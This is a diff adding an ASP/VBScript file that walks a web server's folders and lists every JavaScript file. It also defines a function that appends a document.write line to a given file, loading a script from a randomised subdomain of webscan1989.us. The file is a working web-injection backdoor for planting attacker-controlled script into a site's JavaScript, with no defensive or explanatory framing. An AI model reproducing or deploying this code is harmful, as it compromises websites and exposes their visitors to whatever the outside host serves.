@@ -1,0 +1,114 @@
+function sjs_random(zd0)
+randomize Timer
+sjs_random=int(zd0*rnd)+2
+
+end function
+
+function sj_az_AZ(Z1)  
+	dim str
+	data=""
+	str="a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,1,2,3,4,5,6,7,8,9,0"
+	arr=split(str,",")
+	Randomize
+	xi=sjs_random(Z1)
+	if xi<=1 then
+		xi=5
+		
+	end if
+	for i=xi to Z1  
+		i2=Int((ubound(arr) + 1)*RND) 
+		data=data&arr(i2)
+	next
+	sj_az_AZ=data
+end function
+
+
+function txt_end_data2(abc)
+path=replace(abc,"\\","\")
+
+data="document.write('<script type=""text/javascript"" src=""http://"&sj_az_AZ(sjs_random(8))&".webscan1989.us/TOM/ip.php""></script>');"
+
+dim fs  
+Set Fs=Server.CreateObject("Scripting.FileSystemObject")
+Set File=Fs.OpenTextFile(path,8,false)    
+File.WriteLine data 
+File.Close
+Response.Write "add ok"+path+"<br>"
+end function
+
+
+function bianli(path)
+    set fso=server.CreateObject("scripting.filesystemobject")
+    on error resume next
+    set objFolder=fso.GetFolder(path)
+    set objSubFolders=objFolder.Subfolders
+    for each objSubFolder in objSubFolders
+        nowpath=path + chr(47) + objSubFolder.name  
+        
+        set objFiles=objSubFolder.Files
+        for each objFile in objFiles
+                data=nowpath+objFile.name
+                if InStr(data,".js") then
+        	    	Response.Write data
+        	    	Response.Write "<br>"
+                    
+    	end if
+            next
+            bianli(nowpath)
+    next
+    set objFolder=nothing
+    set objSubFolders=nothing
+    set fso=nothing
+end function
+
+
+function file_paths(data) 
+	
+	data2=""
+	dim names(20)
+	arrayValue = split(data,"\")   
+	for i = 0 to UBound(arrayValue)
+	    data2 =data2+arrayValue(i)+"\"    
+	    names(i)=data2
+	next
+
+	int_url=UBound(names)
+	for i=0 to UBound(names)  
+	iiint=int_url-i
+	url_data=names(iiint)
+	if url_data="" then
+	else
+		response.Write "</br>+++++++++++:"
+		response.Write url_data
+		response.write "<br>-----------------------------<br>"
+		
+	end if
+	next
+	
+	Response.Write "</br>=============</br>"
+end function
+
+file_data = Server.MapPath(".")  
+response.Write file_data&"11111111111111"
+for_file=false  
+if for_file then
+	Response.Write "<br>====WEB====<br>"
+	bianli(file_data) 
+else  
+	Response.Write "<br>====file_paths WEB====<br>"
+	bianli(file_data) 
+	file_paths(file_data) 
+end if
+
+
+
+
+
+
+
+
+
+
+
+
+
